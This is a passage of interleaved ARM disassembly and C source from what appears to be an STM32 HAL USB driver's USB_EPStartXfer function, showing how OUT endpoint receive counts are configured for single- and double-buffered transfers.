 8007a2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a32:	681b      	ldr	r3, [r3, #0]
 8007a34:	781b      	ldrb	r3, [r3, #0]
 8007a36:	009b      	lsls	r3, r3, #2
 8007a38:	441a      	add	r2, r3
 8007a3a:	897b      	ldrh	r3, [r7, #10]
 8007a3c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007a40:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007a44:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007a48:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007a4c:	b29b      	uxth	r3, r3
 8007a4e:	8013      	strh	r3, [r2, #0]
 8007a50:	f000 bcde 	b.w	8008410 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 8007a54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a5c:	681b      	ldr	r3, [r3, #0]
 8007a5e:	7b1b      	ldrb	r3, [r3, #12]
 8007a60:	2b00      	cmp	r3, #0
 8007a62:	f040 80bb 	bne.w	8007bdc <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 8007a66:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a6a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a6e:	681b      	ldr	r3, [r3, #0]
 8007a70:	699a      	ldr	r2, [r3, #24]
 8007a72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a7a:	681b      	ldr	r3, [r3, #0]
 8007a7c:	691b      	ldr	r3, [r3, #16]
 8007a7e:	429a      	cmp	r2, r3
 8007a80:	d917      	bls.n	8007ab2 <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 8007a82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a8a:	681b      	ldr	r3, [r3, #0]
 8007a8c:	691b      	ldr	r3, [r3, #16]
 8007a8e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 8007a92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a96:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a9a:	681b      	ldr	r3, [r3, #0]
 8007a9c:	699a      	ldr	r2, [r3, #24]
 8007a9e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007aa2:	1ad2      	subs	r2, r2, r3
 8007aa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007aa8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007aac:	681b      	ldr	r3, [r3, #0]
 8007aae:	619a      	str	r2, [r3, #24]
 8007ab0:	e00e      	b.n	8007ad0 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 8007ab2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ab6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007aba:	681b      	ldr	r3, [r3, #0]
 8007abc:	699b      	ldr	r3, [r3, #24]
 8007abe:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007ac2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ac6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007aca:	681b      	ldr	r3, [r3, #0]
 8007acc:	2200      	movs	r2, #0
 8007ace:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007ad0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ad4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ad8:	681b      	ldr	r3, [r3, #0]
 8007ada:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007ade:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ae2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ae6:	681b      	ldr	r3, [r3, #0]
 8007ae8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007aec:	b29b      	uxth	r3, r3
 8007aee:	461a      	mov	r2, r3
 8007af0:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007af4:	4413      	add	r3, r2
 8007af6:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007afa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007afe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b02:	681b      	ldr	r3, [r3, #0]
 8007b04:	781b      	ldrb	r3, [r3, #0]
 8007b06:	00da      	lsls	r2, r3, #3
 8007b08:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007b0c:	4413      	add	r3, r2
 8007b0e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007b12:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 8007b16:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b1a:	881b      	ldrh	r3, [r3, #0]
 8007b1c:	b29b      	uxth	r3, r3
 8007b1e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007b22:	b29a      	uxth	r2, r3
 8007b24:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b28:	801a      	strh	r2, [r3, #0]
 8007b2a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007b2e:	2b3e      	cmp	r3, #62	; 0x3e
 8007b30:	d924      	bls.n	8007b7c <USB_EPStartXfer+0xec2>
 8007b32:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007b36:	095b      	lsrs	r3, r3, #5
 8007b38:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007b3c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007b40:	f003 031f 	and.w	r3, r3, #31
 8007b44:	2b00      	cmp	r3, #0
 8007b46:	d104      	bne.n	8007b52 <USB_EPStartXfer+0xe98>
 8007b48:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b4c:	3b01      	subs	r3, #1
 8007b4e:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007b52:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b56:	881b      	ldrh	r3, [r3, #0]
 8007b58:	b29a      	uxth	r2, r3
 8007b5a:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b5e:	b29b      	uxth	r3, r3
 8007b60:	029b      	lsls	r3, r3, #10
 8007b62:	b29b      	uxth	r3, r3
 8007b64:	4313      	orrs	r3, r2
 8007b66:	b29b      	uxth	r3, r3
 8007b68:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007b6c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007b70:	b29a      	uxth	r2, r3
 8007b72:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b76:	801a      	strh	r2, [r3, #0]
 8007b78:	f000 bc10 	b.w	800839c <USB_EPStartXfer+0x16e2>
 8007b7c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007b80:	2b00      	cmp	r3, #0
 8007b82:	d10c      	bne.n	8007b9e <USB_EPStartXfer+0xee4>
 8007b84:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b88:	881b      	ldrh	r3, [r3, #0]
 8007b8a:	b29b      	uxth	r3, r3
 8007b8c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007b90:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007b94:	b29a      	uxth	r2, r3
 8007b96:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b9a:	801a      	strh	r2, [r3, #0]
 8007b9c:	e3fe      	b.n	800839c <USB_EPStartXfer+0x16e2>
 8007b9e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ba2:	085b      	lsrs	r3, r3, #1
 8007ba4:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007ba8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007bac:	f003 0301 	and.w	r3, r3, #1
 8007bb0:	2b00      	cmp	r3, #0
 8007bb2:	d004      	beq.n	8007bbe <USB_EPStartXfer+0xf04>
 8007bb4:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007bb8:	3301      	adds	r3, #1
 8007bba:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007bbe:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007bc2:	881b      	ldrh	r3, [r3, #0]
 8007bc4:	b29a      	uxth	r2, r3
 8007bc6:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007bca:	b29b      	uxth	r3, r3
 8007bcc:	029b      	lsls	r3, r3, #10
 8007bce:	b29b      	uxth	r3, r3
 8007bd0:	4313      	orrs	r3, r2
 8007bd2:	b29a      	uxth	r2, r3
 8007bd4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007bd8:	801a      	strh	r2, [r3, #0]
 8007bda:	e3df      	b.n	800839c <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 8007bdc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007be0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007be4:	681b      	ldr	r3, [r3, #0]
 8007be6:	78db      	ldrb	r3, [r3, #3]
 8007be8:	2b02      	cmp	r3, #2
 8007bea:	f040 8218 	bne.w	800801e <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 8007bee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bf2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bf6:	681b      	ldr	r3, [r3, #0]
 8007bf8:	785b      	ldrb	r3, [r3, #1]
 8007bfa:	2b00      	cmp	r3, #0
 8007bfc:	f040 809d 	bne.w	8007d3a <USB_EPStartXfer+0x1080>
 8007c00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c04:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c08:	681b      	ldr	r3, [r3, #0]
 8007c0a:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007c0e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c12:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c16:	681b      	ldr	r3, [r3, #0]
 8007c18:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007c1c:	b29b      	uxth	r3, r3
 8007c1e:	461a      	mov	r2, r3
 8007c20:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007c24:	4413      	add	r3, r2
 8007c26:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007c2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c32:	681b      	ldr	r3, [r3, #0]
 8007c34:	781b      	ldrb	r3, [r3, #0]
 8007c36:	00da      	lsls	r2, r3, #3
 8007c38:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007c3c:	4413      	add	r3, r2
 8007c3e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007c42:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007c46:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c4a:	881b      	ldrh	r3, [r3, #0]
 8007c4c:	b29b      	uxth	r3, r3
 8007c4e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007c52:	b29a      	uxth	r2, r3
 8007c54:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c58:	801a      	strh	r2, [r3, #0]
 8007c5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c5e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c62:	681b      	ldr	r3, [r3, #0]
 8007c64:	691b      	ldr	r3, [r3, #16]
 8007c66:	2b3e      	cmp	r3, #62	; 0x3e
 8007c68:	d92b      	bls.n	8007cc2 <USB_EPStartXfer+0x1008>
 8007c6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c72:	681b      	ldr	r3, [r3, #0]
 8007c74:	691b      	ldr	r3, [r3, #16]
 8007c76:	095b      	lsrs	r3, r3, #5
 8007c78:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c80:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c84:	681b      	ldr	r3, [r3, #0]
 8007c86:	691b      	ldr	r3, [r3, #16]
 8007c88:	f003 031f 	and.w	r3, r3, #31
 8007c8c:	2b00      	cmp	r3, #0
 8007c8e:	d104      	bne.n	8007c9a <USB_EPStartXfer+0xfe0>
 8007c90:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007c94:	3b01      	subs	r3, #1
 8007c96:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c9a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c9e:	881b      	ldrh	r3, [r3, #0]
 8007ca0:	b29a      	uxth	r2, r3
 8007ca2:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007ca6:	b29b      	uxth	r3, r3
 8007ca8:	029b      	lsls	r3, r3, #10
 8007caa:	b29b      	uxth	r3, r3
 8007cac:	4313      	orrs	r3, r2
 8007cae:	b29b      	uxth	r3, r3
 8007cb0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007cb4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007cb8:	b29a      	uxth	r2, r3
 8007cba:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007cbe:	801a      	strh	r2, [r3, #0]
 8007cc0:	e070      	b.n	8007da4 <USB_EPStartXfer+0x10ea>
 8007cc2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cc6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cca:	681b      	ldr	r3, [r3, #0]
 8007ccc:	691b      	ldr	r3, [r3, #16]
 8007cce:	2b00      	cmp	r3, #0
 8007cd0:	d10c      	bne.n	8007cec <USB_EPStartXfer+0x1032>
 8007cd2:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007cd6:	881b      	ldrh	r3, [r3, #0]
 8007cd8:	b29b      	uxth	r3, r3
 8007cda:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007cde:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ce2:	b29a      	uxth	r2, r3
 8007ce4:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007ce8:	801a      	strh	r2, [r3, #0]
 8007cea:	e05b      	b.n	8007da4 <USB_EPStartXfer+0x10ea>
 8007cec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cf0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cf4:	681b      	ldr	r3, [r3, #0]
 8007cf6:	691b      	ldr	r3, [r3, #16]
 8007cf8:	085b      	lsrs	r3, r3, #1
 8007cfa:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007cfe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d02:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d06:	681b      	ldr	r3, [r3, #0]
 8007d08:	691b      	ldr	r3, [r3, #16]
 8007d0a:	f003 0301 	and.w	r3, r3, #1
 8007d0e:	2b00      	cmp	r3, #0
 8007d10:	d004      	beq.n	8007d1c <USB_EPStartXfer+0x1062>
 8007d12:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007d16:	3301      	adds	r3, #1
 8007d18:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007d1c:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007d20:	881b      	ldrh	r3, [r3, #0]
 8007d22:	b29a      	uxth	r2, r3
 8007d24:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007d28:	b29b      	uxth	r3, r3
 8007d2a:	029b      	lsls	r3, r3, #10
 8007d2c:	b29b      	uxth	r3, r3
 8007d2e:	4313      	orrs	r3, r2
 8007d30:	b29a      	uxth	r2, r3
 8007d32:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007d36:	801a      	strh	r2, [r3, #0]
 8007d38:	e034      	b.n	8007da4 <USB_EPStartXfer+0x10ea>
 8007d3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d42:	681b      	ldr	r3, [r3, #0]
 8007d44:	785b      	ldrb	r3, [r3, #1]
 8007d46:	2b01      	cmp	r3, #1
 8007d48:	d12c      	bne.n	8007da4 <USB_EPStartXfer+0x10ea>
 8007d4a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d4e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d52:	681b      	ldr	r3, [r3, #0]
 8007d54:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007d58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d5c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d60:	681b      	ldr	r3, [r3, #0]
 8007d62:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007d66:	b29b      	uxth	r3, r3
 8007d68:	461a      	mov	r2, r3
 8007d6a:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007d6e:	4413      	add	r3, r2
 8007d70:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007d74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d7c:	681b      	ldr	r3, [r3, #0]
 8007d7e:	781b      	ldrb	r3, [r3, #0]
 8007d80:	00da      	lsls	r2, r3, #3
 8007d82:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007d86:	4413      	add	r3, r2
 8007d88:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007d8c:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007d90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d98:	681b      	ldr	r3, [r3, #0]
 8007d9a:	691b      	ldr	r3, [r3, #16]
 8007d9c:	b29a      	uxth	r2, r3
 8007d9e:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007da2:	801a      	strh	r2, [r3, #0]
 8007da4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007da8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007dac:	681b      	ldr	r3, [r3, #0]
 8007dae:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007db2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007db6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dba:	681b      	ldr	r3, [r3, #0]
 8007dbc:	785b      	ldrb	r3, [r3, #1]
 8007dbe:	2b00      	cmp	r3, #0
 8007dc0:	f040 809d 	bne.w	8007efe <USB_EPStartXfer+0x1244>
 8007dc4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dc8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007dcc:	681b      	ldr	r3, [r3, #0]
 8007dce:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007dd2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dd6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007dda:	681b      	ldr	r3, [r3, #0]
 8007ddc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007de0:	b29b      	uxth	r3, r3
 8007de2:	461a      	mov	r2, r3
 8007de4:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007de8:	4413      	add	r3, r2
 8007dea:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007dee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007df2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007df6:	681b      	ldr	r3, [r3, #0]
 8007df8:	781b      	ldrb	r3, [r3, #0]
 8007dfa:	00da      	lsls	r2, r3, #3
 8007dfc:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007e00:	4413      	add	r3, r2
 8007e02:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007e06:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007e0a:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e0e:	881b      	ldrh	r3, [r3, #0]
 8007e10:	b29b      	uxth	r3, r3
 8007e12:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007e16:	b29a      	uxth	r2, r3
 8007e18:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e1c:	801a      	strh	r2, [r3, #0]
 8007e1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e22:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e26:	681b      	ldr	r3, [r3, #0]
 8007e28:	691b      	ldr	r3, [r3, #16]
 8007e2a:	2b3e      	cmp	r3, #62	; 0x3e
 8007e2c:	d92b      	bls.n	8007e86 <USB_EPStartXfer+0x11cc>
 8007e2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e36:	681b      	ldr	r3, [r3, #0]
 8007e38:	691b      	ldr	r3, [r3, #16]
 8007e3a:	095b      	lsrs	r3, r3, #5
 8007e3c:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e48:	681b      	ldr	r3, [r3, #0]
 8007e4a:	691b      	ldr	r3, [r3, #16]
 8007e4c:	f003 031f 	and.w	r3, r3, #31
 8007e50:	2b00      	cmp	r3, #0
 8007e52:	d104      	bne.n	8007e5e <USB_EPStartXfer+0x11a4>
 8007e54:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e58:	3b01      	subs	r3, #1
 8007e5a:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e5e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e62:	881b      	ldrh	r3, [r3, #0]
 8007e64:	b29a      	uxth	r2, r3
 8007e66:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e6a:	b29b      	uxth	r3, r3
 8007e6c:	029b      	lsls	r3, r3, #10
 8007e6e:	b29b      	uxth	r3, r3
 8007e70:	4313      	orrs	r3, r2
 8007e72:	b29b      	uxth	r3, r3
 8007e74:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007e78:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007e7c:	b29a      	uxth	r2, r3
 8007e7e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e82:	801a      	strh	r2, [r3, #0]
 8007e84:	e069      	b.n	8007f5a <USB_EPStartXfer+0x12a0>
 8007e86:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e8a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e8e:	681b      	ldr	r3, [r3, #0]
 8007e90:	691b      	ldr	r3, [r3, #16]
 8007e92:	2b00      	cmp	r3, #0
 8007e94:	d10c      	bne.n	8007eb0 <USB_EPStartXfer+0x11f6>
 8007e96:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e9a:	881b      	ldrh	r3, [r3, #0]
 8007e9c:	b29b      	uxth	r3, r3
 8007e9e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007ea2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ea6:	b29a      	uxth	r2, r3
 8007ea8:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007eac:	801a      	strh	r2, [r3, #0]
 8007eae:	e054      	b.n	8007f5a <USB_EPStartXfer+0x12a0>
 8007eb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eb8:	681b      	ldr	r3, [r3, #0]
 8007eba:	691b      	ldr	r3, [r3, #16]
 8007ebc:	085b      	lsrs	r3, r3, #1
 8007ebe:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007ec2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ec6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eca:	681b      	ldr	r3, [r3, #0]
 8007ecc:	691b      	ldr	r3, [r3, #16]
 8007ece:	f003 0301 	and.w	r3, r3, #1
 8007ed2:	2b00      	cmp	r3, #0
 8007ed4:	d004      	beq.n	8007ee0 <USB_EPStartXfer+0x1226>
 8007ed6:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007eda:	3301      	adds	r3, #1
 8007edc:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007ee0:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007ee4:	881b      	ldrh	r3, [r3, #0]
 8007ee6:	b29a      	uxth	r2, r3
 8007ee8:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007eec:	b29b      	uxth	r3, r3
 8007eee:	029b      	lsls	r3, r3, #10
 8007ef0:	b29b      	uxth	r3, r3
 8007ef2:	4313      	orrs	r3, r2
 8007ef4:	b29a      	uxth	r2, r3
 8007ef6:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007efa:	801a      	strh	r2, [r3, #0]
 8007efc:	e02d      	b.n	8007f5a <USB_EPStartXfer+0x12a0>
 8007efe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f02:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f06:	681b      	ldr	r3, [r3, #0]
 8007f08:	785b      	ldrb	r3, [r3, #1]
 8007f0a:	2b01      	cmp	r3, #1
 8007f0c:	d125      	bne.n	8007f5a <USB_EPStartXfer+0x12a0>
 8007f0e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f12:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f16:	681b      	ldr	r3, [r3, #0]
 8007f18:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007f1c:	b29b      	uxth	r3, r3
 8007f1e:	461a      	mov	r2, r3
 8007f20:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007f24:	4413      	add	r3, r2
 8007f26:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007f2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f32:	681b      	ldr	r3, [r3, #0]
 8007f34:	781b      	ldrb	r3, [r3, #0]
 8007f36:	00da      	lsls	r2, r3, #3
 8007f38:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007f3c:	4413      	add	r3, r2
 8007f3e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007f42:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007f46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f4a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f4e:	681b      	ldr	r3, [r3, #0]
 8007f50:	691b      	ldr	r3, [r3, #16]
 8007f52:	b29a      	uxth	r2, r3
 8007f54:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007f58:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007f5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f5e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f62:	681b      	ldr	r3, [r3, #0]
 8007f64:	69db      	ldr	r3, [r3, #28]
 8007f66:	2b00      	cmp	r3, #0
 8007f68:	f000 8218 	beq.w	800839c <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007f6c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f70:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f74:	681a      	ldr	r2, [r3, #0]
 8007f76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f7a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f7e:	681b      	ldr	r3, [r3, #0]
 8007f80:	781b      	ldrb	r3, [r3, #0]
 8007f82:	009b      	lsls	r3, r3, #2
 8007f84:	4413      	add	r3, r2
 8007f86:	881b      	ldrh	r3, [r3, #0]
